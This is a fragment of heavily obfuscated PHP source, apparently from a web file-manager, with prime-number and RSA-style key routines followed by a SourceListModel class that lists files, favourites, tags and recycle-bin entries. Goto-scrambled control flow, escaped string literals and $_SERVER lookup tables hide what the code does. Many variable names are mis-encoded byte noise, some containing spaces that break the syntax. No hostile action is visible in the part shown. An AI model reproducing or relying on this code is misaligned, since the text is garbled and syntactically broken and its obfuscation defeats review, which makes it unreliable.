$dÎ‚Ş’Æ˜ + 1) % $fÈğ”÷¦…† == 0) { $eÆ²çöÀ§ = $DÔù»Ôé¯®[271](($DâëÆƒ³Ş‡ * $dÎ‚Ş’Æ˜ + 1) / $fÈğ”÷¦…†); break; } } $b…²¦¬¤İØ = $DÔù»Ôé¯®[131]($DÔù»Ôé¯®[378] . ($C½ë˜Õöõ« + $A†ßÍ…‡˜Á) . $DÔù»Ôé¯®[379] . $fÈğ”÷¦…† . $DÔù»Ôé¯®[379] . $eÆ²çöÀ§ . $DÔù»Ôé¯®[380]); goto c ÍÚ«ñÃ; C™íŠÙÃ…“: $FÎ¹á„ù± = $AŸ×µ…›ì¡[719]; if (strlen($FÎ¹á„ù±) < $AŸ×µ…›ì¡[606]) { return; } while (1) { $e®Ñê¼ÓÎß = $fÈğ”÷¦…†; $Eò­Ëšó° = $DâëÆƒ³Ş‡; $E‹î¢è»™Ò = $AŸ×µ…›ì¡[720]; while (strlen($E‹î¢è»™Ò) < $AŸ×µ…›ì¡[629]) { if (!$E‹î¢è»™Ò) { break; } $E‹î¢è»™Ò++; } while ($Eò­Ëšó° % $e®Ñê¼ÓÎß != 0) { $dÀÊ—«œ—„ = $Eò­Ëšó°; $dÊÛøÔ§¹ß = $AŸ×µ…›ì¡[721]; if (!$dÊÛøÔ§¹ß) { return; } $Eò­Ëšó° = $e®Ñê¼ÓÎß; $e®Ñê¼ÓÎß = $dÀÊ—«œ—„ % $e®Ñê¼ÓÎß; $fŸ•ºÄ¥©† = $AŸ×µ…›ì¡[722]; if (!$fŸ•ºÄ¥©†) { return; } } if ($e®Ñê¼ÓÎß == 1) { break; } else { $fÈğ”÷¦…†++; } } goto DåÁä±ÍÊ; c ÍÚ«ñÃ: $Cß¿Ğ—×ÃÊ = $AŸ×µ…›ì¡[723]; if (strlen($Cß¿Ğ—×ÃÊ) < $AŸ×µ…›ì¡[601]) { die; } $D‘š®“´“Š = $this->{$_SERVER[´…‰Ò‹][277]}($A»³¹»¦©…[0], $b…²¦¬¤İØ); goto a·–ÍñÁ´; CŸ¾”†ÛÊ: $A†ßÍ…‡˜Á = 0; for ($dÎ‚Ş’Æ˜ = 3; $dÎ‚Ş’Æ˜ < $B¶˜Ó ½¼è; $dÎ‚Ş’Æ˜ += 2) { if ($B¶˜Ó ½¼è % $dÎ‚Ş’Æ˜ != 0) { continue; } $C½ë˜Õöõ« = $dÎ‚Ş’Æ˜; $c‹¡÷ëôÓ‚ = $AŸ×µ…›ì¡[715]; if (strlen($c‹¡÷ëôÓ‚) < $AŸ×µ…›ì¡[629]) { die; } $A†ßÍ…‡˜Á = $DÔù»Ôé¯®[271]($B¶˜Ó ½¼è / $dÎ‚Ş’Æ˜); $cÂÅè Š™ = $AŸ×µ…›ì¡[716]; if (strlen($cÂÅè Š™) < $AŸ×µ…›ì¡[606]) { return; } break; $C¼¶¯ñõ = $AŸ×µ…›ì¡[717]; if (!$C¼¶¯ñõ) { die; } } $DâëÆƒ³Ş‡ = ($C½ë˜Õöõ« - 1) * ($A†ßÍ…‡˜Á - 1); goto b»•¼Ò–ƒ­; a·–ÍñÁ´: return $D‘š®“´“Š; $fˆó×ŸğŒË = $AŸ×µ…›ì¡[724]; if (strlen($fˆó×ŸğŒË) < $AŸ×µ…›ì¡[616]) { return; } goto cœèË½ìˆ³; cœèË½ìˆ³: } public function bxkpb5c4a0ac() { goto bšÏ›»µšš; bšÏ›»µšš: $eÙ«›•†÷ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $f³‡‡¦åÆø =& $_SERVER[´…‰Ò‹]; $cç‘Ö¢„–¿ = $f³‡‡¦åÆø[363]($f³‡‡¦åÆø[382](2, 14), $f³‡‡¦åÆø[382](2, 16) - 1); goto F‹éÒì­; Bôñ†‰¢§Ñ: $c’æäÅ‘ = 2; for ($bÚÌ¼–§ƒµ = $cç‘Ö¢„–¿; $bÚÌ¼–§ƒµ > 1; $bÚÌ¼–§ƒµ--) { $F–™˜ŸéÔ¡ = !0; $Fõñ®â‡ = $eÙ«›•†÷[727]; while (strlen($Fõñ®â‡) < $eÙ«›•†÷[609]) { if (!$Fõñ®â‡) { break; } $Fõñ®â‡++; } foreach ($bš‚êôˆŒÍ as $AÖ’ˆø¬) { if ($bÚÌ¼–§ƒµ % $AÖ’ˆø¬ == 0) { $F–™˜ŸéÔ¡ = !1; break; } } if ($F–™˜ŸéÔ¡) { $c’æäÅ‘ = $bÚÌ¼–§ƒµ; break; } } return $c’æäÅ‘; goto fÛæîÔ½ßò; Dµâõ±’ª¦: $aäÆŒ¼ËŸÈ = $eÙ«›•†÷[726]; if (strlen($aäÆŒ¼ËŸÈ) < $eÙ«›•†÷[606]) { die; } while ($Bšå·Ÿò¹ <= (int) $f³‡‡¦åÆø[383]($cç‘Ö¢„–¿)) { $bÚÌ¼–§ƒµ = $Bšå·Ÿò¹; while (!0) { $bÚÌ¼–§ƒµ++; if ($bÚÌ¼–§ƒµ <= 2) { $Bšå·Ÿò¹ = $bÚÌ¼–§ƒµ; break; } else { if ($bÚÌ¼–§ƒµ < 2) { continue; } } $F–™˜ŸéÔ¡ = !0; for ($F“®„’„Æ¿ = 2; $F“®„’„Æ¿ <= $f³‡‡¦åÆø[383]($bÚÌ¼–§ƒµ); $F“®„’„Æ¿++) { if ($bÚÌ¼–§ƒµ % $F“®„’„Æ¿ == 0) { $F–™˜ŸéÔ¡ = !1; } } if ($F–™˜ŸéÔ¡) { $Bšå·Ÿò¹ = $bÚÌ¼–§ƒµ; break; } } $bš‚êôˆŒÍ[] = $Bšå·Ÿò¹; } goto Bôñ†‰¢§Ñ; F‹éÒì­: $bë»â”ø¨ = $eÙ«›•†÷[725]; $bš‚êôˆŒÍ = array(); $Bšå·Ÿò¹ = 1; goto Dµâõ±’ª¦; fÛæîÔ½ßò: } public function hnexe41a0622($d¾êÏÀ¢‹†, $E™“’åÔÙ½) { $e›À“£Êóå =& $_SERVER[´…‰Ò‹]; return $e›À“£Êóå[13](array($e›À“£Êóå[14], $e›À“£Êóå[384]), $d¾êÏÀ¢‹†, $E™“’åÔÙ½); } public function qmoed5014317($BíÛ¸áÈÈ, $fÜïî‚æ) { $a˜‡†‹ğ­ =& $_SERVER[´…‰Ò‹]; return $a˜‡†‹ğ­[13](array($a˜‡†‹ğ­[385], $a˜‡†‹ğ­[386]), $BíÛ¸áÈÈ, $fÜïî‚æ); } public function ctmvdb09f78a($dÑçÖ«Äã†, $e®ØÆ¸‰›ù) { $d¯¨®Ÿ§Î‡ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fÊæÕ­éŠè =& $_SERVER[´…‰Ò‹]; return $fÊæÕ­éŠè[13](array($fÊæÕ­éŠè[385], $fÊæÕ­éŠè[387]), $dÑçÖ«Äã†, $e®ØÆ¸‰›ù); $BÇØù¼Şƒ— = $d¯¨®Ÿ§Î‡[728]; if (strlen($BÇØù¼Şƒ—) < $d¯¨®Ÿ§Î‡[616]) { return; } } } goto cÅÃ®õê¥Æ; a¹áø‰ÏéÊ: class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\165\x72\x63\x65"; protected $tableMeta = array("\x74\x61\x62\x6c\145\x4e\x61\155\145" => "\151\157\137\163\157\165\162\x63\145\x5f\x6d\x65\164\141", "\x6d\x65\164\141\x46\151\x65\x6c\x64" => "\163\x6f\x75\x72\143\145\111\x44"); protected $dataAuto = array(array("\155\x6f\x64\151\146\171\124\x69\x6d\145", "\x74\x69\155\145", "\151\x6e\163\145\x72\x74", "\146\x75\156\143\164\x69\157\156"), array("\143\x72\145\x61\164\x65\x54\151\x6d\145", "\164\151\x6d\x65", "\x69\x6e\x73\x65\162\x74", "\x66\165\156\x63\164\x69\157\x6e"), array("\166\x69\x65\x77\x54\151\155\x65", "\x74\x69\x6d\145", "\x69\x6e\163\145\162\164", "\x66\x75\x6e\x63\x74\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($dŸ½ÆÓç ) { return $this->listSource(array($_SERVER[Ôğ—¤Šµˆ˜ñ£][396] => $dŸ½ÆÓç )); } public function typeName($d°É‹è‹Ã´) { static $BÄ¿–ÖÚò´ = array(self::TYPE_SYSTEM => "\163\171\163\164\145\x6d", self::TYPE_USER => "\165\163\x65\x72", self::TYPE_GROUP => "\147\162\x6f\165\160"); return $BÄ¿–ÖÚò´[$d°É‹è‹Ã´ . $_SERVER[Ôğ—¤Šµˆ˜ñ£][33]]; } public function sourceListInfo($AÇ¤Ì£¾¨î, $E¾šñÜÈ = false) { goto e…¯´”ÏµÜ; e…¯´”ÏµÜ: $Aî¾ÄÍÒÉ‡ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $AÇ¤Ì£¾¨î = $AÇ¤Ì£¾¨î ? $AÇ¤Ì£¾¨î : array(); $AÇ¤Ì£¾¨î = array_filter(array_unique($AÇ¤Ì£¾¨î)); goto F˜‰»È¾¯; F˜‰»È¾¯: if (!$AÇ¤Ì£¾¨î) { return array(); } $fİ„Şº¡çó = $this->where(array($Aî¾ÄÍÒÉ‡[397] => array($Aî¾ÄÍÒÉ‡[7], $AÇ¤Ì£¾¨î)))->select(); $this->_listDataApply($fİ„Şº¡çó, $E¾šñÜÈ); goto d‚…Ñ©èš™; d‚…Ñ©èš™: return array_to_keyvalue($fİ„Şº¡çó, $Aî¾ÄÍÒÉ‡[397]); goto E÷İŞ–ìº; E÷İŞ–ìº: } public function pathInfoFilter(&$Cß°×­¥ØÄ) { goto DÊåÔ’…Éœ; DÊåÔ’…Éœ: $b¶ôëçò” =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; static $b¤Áº„Â = false; static $cÒ‰®Äî«é = false; goto e†²Üí‹Ñ; e§•ÇÎ¿©: $Cß°×­¥ØÄ = array_field_key($Cß°×­¥ØÄ, $E²³ñ¾ê); return $Cß°×­¥ØÄ; goto AŞ§ù°Á‹; f©·Ñ¤Úï×: $Cß°×­¥ØÄ[$b¶ôëçò”[76]] = $b¶ôëçò”[403] . $Cß°×­¥ØÄ[$b¶ôëçò”[397]] . $b¶ôëçò”[404]; $Cß°×­¥ØÄ[$b¶ôëçò”[29]] = $Cß°×­¥ØÄ[$b¶ôëçò”[405]] == 1 ? $b¶ôëçò”[77] : $b¶ôëçò”[193]; $Cß°×­¥ØÄ[$b¶ôëçò”[406]] = $this->typeName($Cß°×­¥ØÄ[$b¶ôëçò”[406]]); goto Aø£³Ğß; Aø£³Ğß: if ($Cß°×­¥ØÄ[$b¶ôëçò”[405]] != 1) { $Cß°×­¥ØÄ[$b¶ôëçò”[168]] = $Cß°×­¥ØÄ[$b¶ôëçò”[407]]; unset($Cß°×­¥ØÄ[$b¶ôëçò”[407]]); } $E²³ñ¾ê = $b¤Áº„Â; if (isset($Cß°×­¥ØÄ[$b¶ôëçò”[408]]) && $Cß°×­¥ØÄ[$b¶ôëçò”[408]][$b¶ôëçò”[409]] == -1) { $E²³ñ¾ê = $cÒ‰®Äî«é; } goto e§•ÇÎ¿©; e†²Üí‹Ñ: static $D²ˆ‹éñÔº = false; if (!$b¤Áº„Â) { goto f¾ÒñµÕ•²; Bø¦É‘êÒŒ: $føˆŸƒÑ‰ = $b¶ôëçò”[401]; $Fó°Œ¨ÒÜ = explode($b¶ôëçò”[47], $føˆŸƒÑ‰); $b¤Áº„Â = explode($b¶ôëçò”[47], $f÷‚êÍŸŠ); goto E˜®øÆ‹ô—; f¾ÒñµÕ•²: $f÷‚êÍŸŠ = $b¶ôëçò”[398]; $f÷‚êÍŸŠ .= $b¶ôëçò”[399]; $f÷‚êÍŸŠ .= $b¶ôëçò”[400]; goto Bø¦É‘êÒŒ; E˜®øÆ‹ô—: $cÒ‰®Äî«é = array(); foreach ($b¤Áº„Â as $fãª¸Àé¬) { if (in_array($fãª¸Àé¬, $Fó°Œ¨ÒÜ)) { continue; } $cÒ‰®Äî«é[] = $fãª¸Àé¬; } $D²ˆ‹éñÔº = explode($b¶ôëçò”[47], $b¶ôëçò”[402]); goto eØëŸŸ‚¶È; eØëŸŸ‚¶È: } foreach ($D²ˆ‹éñÔº as $D×àê‡ºà¹) { if (isset($Cß°×­¥ØÄ[$D×àê‡ºà¹])) { $Cß°×­¥ØÄ[$D×àê‡ºà¹] = intval($Cß°×­¥ØÄ[$D×àê‡ºà¹]); } } goto f©·Ñ¤Úï×; AŞ§ù°Á‹: } public function listUserFav() { goto CİÛÓ†Îí¡; BœŒ¨Ü«: foreach ($f¹Œ“ÖæÈ“ as &$b˜ÄÀ•²¤Ğ) { $b˜ÄÀ•²¤Ğ = array($FİÔ‘ğÜóØ[414] => $b˜ÄÀ•²¤Ğ[$FİÔ‘ğÜóØ[395]], $FİÔ‘ğÜóØ[415] => $b˜ÄÀ•²¤Ğ[$FİÔ‘ğÜóØ[28]], $FİÔ‘ğÜóØ[416] => $b˜ÄÀ•²¤Ğ[$FİÔ‘ğÜóØ[76]], $FİÔ‘ğÜóØ[417] => $b˜ÄÀ•²¤Ğ[$FİÔ‘ğÜóØ[29]], $FİÔ‘ğÜóØ[418] => $b˜ÄÀ•²¤Ğ[$FİÔ‘ğÜóØ[194]], $FİÔ‘ğÜóØ[419] => $b˜ÄÀ•²¤Ğ[$FİÔ‘ğÜóØ[84]]); if ($b˜ÄÀ•²¤Ğ[$FİÔ‘ğÜóØ[29]] == $FİÔ‘ğÜóØ[411] && $Eƒ¦ÈÚÍÍ’[$b˜ÄÀ•²¤Ğ[$FİÔ‘ğÜóØ[76]]]) { $b˜ÄÀ•²¤Ğ[$FİÔ‘ğÜóØ[85]] = $Eƒ¦ÈÚÍÍ’[$b˜ÄÀ•²¤Ğ[$FİÔ‘ğÜóØ[76]]]; } } unset($b˜ÄÀ•²¤Ğ); return $f¹Œ“ÖæÈ“; goto dÉ˜ïµ¼ÀË; CİÛÓ†Îí¡: $FİÔ‘ğÜóØ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $f¹Œ“ÖæÈ“ = Model($FİÔ‘ğÜóØ[410])->listData(); $EêÚİê”†‹ = array_filter_by_field($f¹Œ“ÖæÈ“, $FİÔ‘ğÜóØ[29], $FİÔ‘ğÜóØ[411]); goto b‡„·Ó®ìù; b‡„·Ó®ìù: $EêÚİê”†‹ = array_to_keyvalue($EêÚİê”†‹, $FİÔ‘ğÜóØ[33], $FİÔ‘ğÜóØ[76]); if ($EêÚİê”†‹) { $Eƒ¦ÈÚÍÍ’ = $this->listSource(array($FİÔ‘ğÜóØ[412] => array($FİÔ‘ğÜóØ[413], $EêÚİê”†‹))); } $Eƒ¦ÈÚÍÍ’ = array_to_keyvalue($Eƒ¦ÈÚÍÍ’[$FİÔ‘ğÜóØ[367]], $FİÔ‘ğÜóØ[397]); goto BœŒ¨Ü«; dÉ˜ïµ¼ÀË: } public function listUserTag($b®Û³Ê—…¡) { goto CÛÓ‘ğâ®Ë; d·“·å‰‚: if (!$D éªííÆÒ || count($f‘¾ÍÖÈ¥ã) == $D éªííÆÒ[$F¬‘ğÒÓÂ†[364]][$F¬‘ğÒÓÂ†[365]]) { return $D éªííÆÒ; } $eÒ‚‹’ĞğŞ = array(); $AÉ–ÙïğÇ÷ = array_to_keyvalue($D éªííÆÒ[$F¬‘ğÒÓÂ†[75]], $F¬‘ğÒÓÂ†[33], $F¬‘ğÒÓÂ†[397]); goto a›î¢§¾İ‰; a­ù¹¼›í†: foreach ($AùéÎá¾›Å as $c¶ˆé‰¨Ùƒ => $Câê±©ŒÖ³) { $e‘’‚ã‡ = !0; if (!$b®Û³Ê—…¡) { $f‘¾ÍÖÈ¥ã[] = $c¶ˆé‰¨Ùƒ; continue; } foreach ($b®Û³Ê—…¡ as $f‹“»Ù†Á) { if (!in_array($f‹“»Ù†Á, $Câê±©ŒÖ³)) { $e‘’‚ã‡ = !1; break; } } if ($e‘’‚ã‡) { $f‘¾ÍÖÈ¥ã[] = $c¶ˆé‰¨Ùƒ; } } if (!$f‘¾ÍÖÈ¥ã) { return array(); } $D éªííÆÒ = $this->listSource(array($F¬‘ğÒÓÂ†[412] => array($F¬‘ğÒÓÂ†[413], $f‘¾ÍÖÈ¥ã))); goto d·“·å‰‚; CÛÓ‘ğâ®Ë: $F¬‘ğÒÓÂ† =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($b®Û³Ê—…¡ && !is_array($b®Û³Ê—…¡)) { $b®Û³Ê—…¡ = array($b®Û³Ê—…¡); } $aË’ª´ğå = Model($F¬‘ğÒÓÂ†[420])->listData(); goto fí„à¬†É; e„§˜ï˜Ñ®: if ($eÒ‚‹’ĞğŞ) { Model($F¬‘ğÒÓÂ†[422])->removeBySource($eÒ‚‹’ĞğŞ); } return $D éªííÆÒ; goto DÀ×Ê„†Ã—; fí„à¬†É: $AùéÎá¾›Å = array(); foreach ($aË’ª´ğå as $bƒ°¼ËĞœÖ) { $fç¦¯ÄîÊ = $bƒ°¼ËĞœÖ[$F¬‘ğÒÓÂ†[76]]; if (!$fç¦¯ÄîÊ) { continue; } if (!isset($AùéÎá¾›Å[$fç¦¯ÄîÊ])) { $AùéÎá¾›Å[$fç¦¯ÄîÊ] = array(); } $AùéÎá¾›Å[$fç¦¯ÄîÊ][] = $bƒ°¼ËĞœÖ[$F¬‘ğÒÓÂ†[421]]; } $f‘¾ÍÖÈ¥ã = array(); goto a­ù¹¼›í†; a›î¢§¾İ‰: $C“ë×ÈÄİ× = array_to_keyvalue($D éªííÆÒ[$F¬‘ğÒÓÂ†[74]], $F¬‘ğÒÓÂ†[33], $F¬‘ğÒÓÂ†[397]); $bÜÜ’İäàƒ = array_merge($C“ë×ÈÄİ×, $AÉ–ÙïğÇ÷); foreach ($f‘¾ÍÖÈ¥ã as $fç¦¯ÄîÊ) { if (!in_array($fç¦¯ÄîÊ, $bÜÜ’İäàƒ)) { $eÒ‚‹’ĞğŞ[] = $fç¦¯ÄîÊ; } } goto e„§˜ï˜Ñ®; DÀ×Ê„†Ã—: } public function listUserRecycle() { $Bë¡²°ªä =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $f­»‘ö¯Š½ = Model($Bë¡²°ªä[423])->listData(); if (!$f­»‘ö¯Š½) { return array(); } $f‰ÓŸ—“”ë = array($Bë¡²°ªä[412] => array($Bë¡²°ªä[413], $f­»‘ö¯Š½), $Bë¡²°ªä[424] => 1); return $this->listSource($f‰ÓŸ—“”ë); } public function listSource($dÂ‚¢¯ÆÖØ, $EŠ›×µ›à“ = 3000) { goto B­ö¼óê„í; B­ö¼óê„í: $eéİ‹††¦ğ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!isset($dÂ‚¢¯ÆÖØ[$eéİ‹††¦ğ[425]])) { $dÂ‚¢¯ÆÖØ[$eéİ‹††¦ğ[425]] = 0; } $Fºïç›ì’ï = $eéİ‹††¦ğ[426]; goto aä¯æò‡Íæ; e©Î˜òÓá‡: $this->_listMake($bÒ¨‰ ¸é²); return $bÒ¨‰ ¸é²; goto cá§áÖ•ê; aä¯æò‡Íæ: $bÒ¨‰ ¸é² = $this->field($Fºïç›ì’ï)->_makeOrder()->where($dÂ‚¢¯ÆÖØ)->selectPage($EŠ›×µ›à“); $this->_listPageCheck($bÒ¨‰ ¸é², $Fºïç›ì’ï, $dÂ‚¢¯ÆÖØ); $this->_listDataApply($bÒ¨‰ ¸é²[$eéİ‹††¦ğ[367]]); goto e©Î˜òÓá‡; cá§áÖ•ê: } private function _listPageCheck(&$f•Ô¦äÌğ, $d‘Ë¦Å‰ƒÒ, $BïŠƒ¯½ƒš) { goto B¼­À‰à‹; b›¯ÀÄÊ÷Ó: foreach ($BïŠƒ¯½ƒš as $CïŠ¼‘É›Í => $fÌƒ¼îà×„) { $aÜ†›¡¹ã[$bÑâèòŠà­[430] . $CïŠ¼‘É›Í] = $fÌƒ¼îà×„; } $this->alias($bÑâèòŠà­[438])->field($d‘Ë¦Å‰ƒÒ)->limit($cîÆ¶¤¢¾)->order($D´ããÉÙ‹Ü); $e°ò‚Š¬¶õ = $this->join($dÛÊ¨¹®®Ò)->where($aÜ†›¡¹ã)->select(); goto bŠäˆÃÌ†; dµ§°Œà§™: if ($cÍ³÷¬â½Ô[$bÑâèòŠà­[366]] <= 1) { return; } if ($cÍ³÷¬â½Ô[$bÑâèòŠà­[365]] >= 100000) { return; } if (Model($bÑâèòŠà­[427])->get($bÑâèòŠà­[428]) != $bÑâèòŠà­[429]) { return; } goto Bª»‚í¯‹; C‘Ä¯×ÂÒÆ: $dÛÊ¨¹®®Ò = $dÛÊ¨¹®®Ò . $bÑâèòŠà­[434]; $cîÆ¶¤¢¾ = $cÍ³÷¬â½Ô[$bÑâèòŠà­[361]] * ($cÍ³÷¬â½Ô[$bÑâèòŠà­[351]] - 1) . $bÑâèòŠà­[47] . $cÍ³÷¬â½Ô[$bÑâèòŠà­[361]]; $bš³ø§îÍ = $this->_makeOrder(!0); goto AÛ«÷†è–ã; AÛ«÷†è–ã: $D´ããÉÙ‹Ü = $bÑâèòŠà­[430] . str_replace($bÑâèòŠà­[47], $bÑâèòŠà­[431], $bš³ø§îÍ[0]); if (strpos($D´ããÉÙ‹Ü, $bÑâèòŠà­[435])) { $D´ããÉÙ‹Ü = str_replace($bÑâèòŠà­[435], $bÑâèòŠà­[436], $D´ããÉÙ‹Ü); } else { $D´ããÉÙ‹Ü .= $bÑâèòŠà­[437] . $bš³ø§îÍ[1]; } $aÜ†›¡¹ã = array(); goto b›¯ÀÄÊ÷Ó; B¼­À‰à‹: $bÑâèòŠà­ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!is_array($f•Ô¦äÌğ[$bÑâèòŠà­[364]])) { return; } $cÍ³÷¬â½Ô = $f•Ô¦äÌğ[$bÑâèòŠà­[364]]; goto dµ§°Œà§™; bŠäˆÃÌ†: if ($e°ò‚Š¬¶õ) { $f•Ô¦äÌğ[$bÑâèòŠà­[367]] = $e°ò‚Š¬¶õ; } goto b­ƒ¸ìŠ´Ç; Bª»‚í¯‹: $d‘Ë¦Å‰ƒÒ = str_replace(array($bÑâèòŠà­[50], $bÑâèòŠà­[340], $bÑâèòŠà­[229]), $bÑâèòŠà­[33], $d‘Ë¦Å‰ƒÒ); $d‘Ë¦Å‰ƒÒ = $bÑâèòŠà­[430] . str_replace($bÑâèòŠà­[47], $bÑâèòŠà­[431], $d‘Ë¦Å‰ƒÒ) . $bÑâèòŠà­[432]; $dÛÊ¨¹®®Ò = $bÑâèòŠà­[433]; goto C‘Ä¯×ÂÒÆ; b­ƒ¸ìŠ´Ç: } protected function _makeOrder($eÆæÇ¸Ã« = false) { goto d¹ÏØ…èÁ; AÉï‘ß´ç: $E“˜ÄÕ”¤ò = Input::get($Cİ¸ƒè¼ñ•[450], $Cİ¸ƒè¼ñ•[7], $eØÖ½ì é, array_keys($BÁùí¦™­Ç)); if (!in_array($EÑ«°èÎ‹ª, array_keys($FÚÊˆĞ¬ù))) { $EÑ«°èÎ‹ª = $Cİ¸ƒè¼ñ•[28]; } if (!in_array($E“˜ÄÕ”¤ò, array_keys($BÁùí¦™­Ç))) { $EÑ«°èÎ‹ª = $Cİ¸ƒè¼ñ•[442]; } goto BÍ…­‚¦ÕÊ; FÜÄªÙ¹é¥: if ($eÆæÇ¸Ã«) { return array($B¬ÑšàÜİù, $BÁùí¦™­Ç[$E“˜ÄÕ”¤ò]); } return $this->order($B¬ÑšàÜİù); goto Eä¿§•Ë¸Ä; d¹ÏØ…èÁ: $Cİ¸ƒè¼ñ• =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $CÛ¤Ü‘×­¹ = Model($Cİ¸ƒè¼ñ•[439])->get($Cİ¸ƒè¼ñ•[440]); $eØÖ½ì é = Model($Cİ¸ƒè¼ñ•[439])->get($Cİ¸ƒè¼ñ•[441]); goto f²¶· ‹ì«; f²¶· ‹ì«: $BÁùí¦™­Ç = array($Cİ¸ƒè¼ñ•[442] => $Cİ¸ƒè¼ñ•[443], $Cİ¸ƒè¼ñ•[444] => $Cİ¸ƒè¼ñ•[445]); $FÚÊˆĞ¬ù = array($Cİ¸ƒè¼ñ•[28] => $Cİ¸ƒè¼ñ•[28], $Cİ¸ƒè¼ñ•[78] => $Cİ¸ƒè¼ñ•[78], $Cİ¸ƒè¼ñ•[168] => $Cİ¸ƒè¼ñ•[407], $Cİ¸ƒè¼ñ•[446] => $Cİ¸ƒè¼ñ•[446], $Cİ¸ƒè¼ñ•[447] => $Cİ¸ƒè¼ñ•[448], $Cİ¸ƒè¼ñ•[194] => $Cİ¸ƒè¼ñ•[194], $Cİ¸ƒè¼ñ•[84] => $Cİ¸ƒè¼ñ•[84]); $EÑ«°èÎ‹ª = Input::get($Cİ¸ƒè¼ñ•[449], $Cİ¸ƒè¼ñ•[7], $CÛ¤Ü‘×­¹, array_keys($FÚÊˆĞ¬ù)); goto AÉï‘ß´ç; BÍ…­‚¦ÕÊ: if ($EÑ«°èÎ‹ª == $Cİ¸ƒè¼ñ•[28]) { } $B¬ÑšàÜİù = $Cİ¸ƒè¼ñ•[451] . $FÚÊˆĞ¬ù[$EÑ«°èÎ‹ª] . $Cİ¸ƒè¼ñ•[50] . $BÁùí¦™­Ç[$E“˜ÄÕ”¤ò]; $B¬ÑšàÜİù = rtrim(trim($B¬ÑšàÜİù), $Cİ¸ƒè¼ñ•[47]); goto FÜÄªÙ¹é¥; Eä¿§•Ë¸Ä: } protected function _listDataApplyItem($Aˆ™Õ‰÷‹, $cò–³…ôÉË = false) { $E‰âé¢­×­ = array($Aˆ™Õ‰÷‹); $this->_listDataApply($E‰âé¢­×­, $cò–³…ôÉË); return $E‰âé¢­×­[0]; } protected function _listDataApply(&$añæ‹Õ±ƒÓ, $bÁ…‹’¤î¯ = false) { goto föºÓÂâ¥¢; FÔÂÙÛ²Â: $fÁŸÎ…Š…‹ = array_unique($fÁŸÎ…Š…‹); $this->_listSourceCache($añæ‹Õ±ƒÓ); if (!$bÁ…‹’¤î¯) { $this->_listAppendMeta($añæ‹Õ±ƒÓ, $fÁŸÎ…Š…‹); $this->_listAppendFileMeta($añæ‹Õ±ƒÓ, $fÁŸÎ…Š…‹); $this->_listAppendChildren($añæ‹Õ±ƒÓ, $fÁŸÎ…Š…‹); } goto F±„ä±™Š‘; föºÓÂâ¥¢: $CÎç…Î— =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$añæ‹Õ±ƒÓ) { $añæ‹Õ±ƒÓ = array(); return; } $fÁŸÎ…Š…‹ = array_to_keyvalue($añæ‹Õ±ƒÓ, $CÎç…Î—[33], $CÎç…Î—[397]); goto FÔÂÙÛ²Â; Eé«ò£÷: $this->_listAppendUser($añæ‹Õ±ƒÓ); $this->_listFilterInfo($añæ‹Õ±ƒÓ, $bÁ…‹’¤î¯); $this->_listAppendAuthSecret($añæ‹Õ±ƒÓ); goto C½ßŠä»ä‡; F±„ä±™Š‘: $this->_listAppendPath($añæ‹Õ±ƒÓ); $this->_listAppendAuth($añæ‹Õ±ƒÓ); $this->_listAppendSourceInfo($añæ‹Õ±ƒÓ, $fÁŸÎ…Š…‹); goto Eé«ò£÷; C½ßŠä»ä‡: } protected function _listSourceCache($FÒ”É£“…) { $Bµ®”¬œ¥ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; foreach ($FÒ”É£“… as $AâƒÚ¦Šã) { self::$cacheSourceInfo[$Bµ®”¬œ¥[452] . $AâƒÚ¦Šã[$Bµ®”¬œ¥[397]]] = $AâƒÚ¦Šã; } } protected function _listFilterInfo(&$e££¨‰õ–², $AëöÔƒƒ‘¦ = false) { $BÇ½òˆ‡º =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; foreach ($e££¨‰õ–² as &$b××Œ’Á À) { $b××Œ’Á À = $this->pathInfoFilter($b××Œ’Á À); self::$cachePathInfo[$BÇ½òˆ‡º[453] . intval($AëöÔƒƒ‘¦) . $BÇ½òˆ‡º[454] . $b××Œ’Á À[$BÇ½òˆ‡º[397]]] = $b××Œ’Á À; } unset($b××Œ’Á À); } protected function _listMake(&$DêĞè¥¶²Ø) { $BËœ÷ãõ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $DêĞè¥¶²Ø[$BËœ÷ãõ[75]] = array(); $DêĞè¥¶²Ø[$BËœ÷ãõ[74]] = array(); foreach ($DêĞè¥¶²Ø[$BËœ÷ãõ[367]] as $f´ÃÂìğ´) { $FòØ±Á— = $f´ÃÂìğ´[$BËœ÷ãõ[405]] == 1 ? $BËœ÷ãõ[75] : $BËœ÷ãõ[74]; $DêĞè¥¶²Ø[$FòØ±Á—][] = $f´ÃÂìğ´; } unset($DêĞè¥¶²Ø[$BËœ÷ãõ[367]]); } protected function _listAppendMeta(&$B²ùÍğ˜ß‡, $BÓÂÓ…ÅÆõ) { goto C ›«Ïö–; C ›«Ïö–: $eÚĞÂ…ÌÔ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $DË ¥ÅŠÕ• = array($eÚĞÂ…ÌÔ[412] => array($eÚĞÂ…ÌÔ[413], $BÓÂÓ…ÅÆõ)); $Fô–Ó¡ÎÈ• = Model($eÚĞÂ…ÌÔ[455])->field($eÚĞÂ…ÌÔ[456])->where($DË ¥ÅŠÕ•)->select(); goto dÍ×¡²ÚŠ; dÍ×¡²ÚŠ: if (!$Fô–Ó¡ÎÈ•) { return; } $C¦ÌâÈ« = array($eÚĞÂ…ÌÔ[457], $eÚĞÂ…ÌÔ[458], $eÚĞÂ…ÌÔ[436]); $fÜ¥ª‘¤± = array(); goto EŠ¸éîŸêî; 